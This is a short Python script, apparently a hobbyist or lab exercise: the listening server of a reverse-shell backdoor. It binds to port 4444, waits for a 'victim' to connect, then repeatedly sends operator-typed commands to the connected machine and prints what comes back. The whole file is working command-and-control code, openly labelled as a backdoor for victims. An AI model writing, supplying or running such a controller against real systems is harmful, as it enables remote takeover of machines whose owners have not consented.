import socket

my_ip="10.211.55.4"
port = 4444
server = socket.socket()
server.bind((my_ip, port))
print('[+] server started')
print('[+] listening for victum')
server.listen(1)
victim, victim_addr = server.accept()
print(f'[+] {victim_addr} victim opened backdoor')


while True:
    command = input('enter command: ').encode()
    victim.send(command)
    print('[+] command sent')
    output = victim.recv(1024).decode()
    print(f"output: {output}")
